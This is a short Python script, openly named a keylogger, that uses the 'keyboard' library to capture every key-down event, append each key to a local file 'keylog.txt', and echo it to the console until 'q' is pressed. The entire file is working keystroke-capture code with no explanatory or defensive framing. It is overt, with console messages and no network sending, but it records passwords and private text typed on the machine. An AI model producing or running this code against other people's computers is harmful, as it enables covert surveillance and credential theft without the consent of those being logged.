import keyboard

def keylogger():
    log_file = 'keylog.txt'
    print("Keylogger started. Press 'q' to quit and save logs.")

    with open(log_file, 'a') as f:
        while True:
            try:
                event = keyboard.read_event()
                
                if event.event_type == keyboard.KEY_DOWN:
                    key = event.name
                    
                    if len(key) > 1:
                        key = f"[{key}]"
                    
                    f.write(key + '\n')
                    print(f"Key logged: {key}")
            
                if event.name == 'q':
                    print("Keylogger stopped and logs saved.")
                    break
            
            except KeyboardInterrupt:
                break

if __name__ == "__main__":
    keylogger()